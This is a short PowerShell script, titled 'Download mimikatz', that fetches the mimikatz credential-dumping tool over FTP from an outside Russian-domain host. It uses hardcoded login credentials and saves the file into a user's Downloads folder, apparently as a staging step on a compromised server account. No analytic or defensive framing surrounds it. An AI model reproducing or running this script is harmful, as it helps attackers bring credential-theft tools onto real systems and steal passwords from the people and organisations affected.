### Download mimikatz
$ftp_uri = 'ftp://mssqlsr:Admin01234@files.netip4.ru/Progs/mimikatz/x64win11/'
$FileName = 'mimikatz.exe'
$LocalPath = 'C:\Users\MSSQLSR\Downloads\'
$user = 'mssqlsr'
$pass = 'Admin01234'

$download_url = $ftp_uri + $FileName
$local_path = $LocalPath + $FileName

$WebClient = New-Object System.Net.WebClient 
$WebClient.Credentials = New-Object System.Net.NetworkCredential($user, $pass)
$WebClient.DownloadFile($download_url, $local_path)
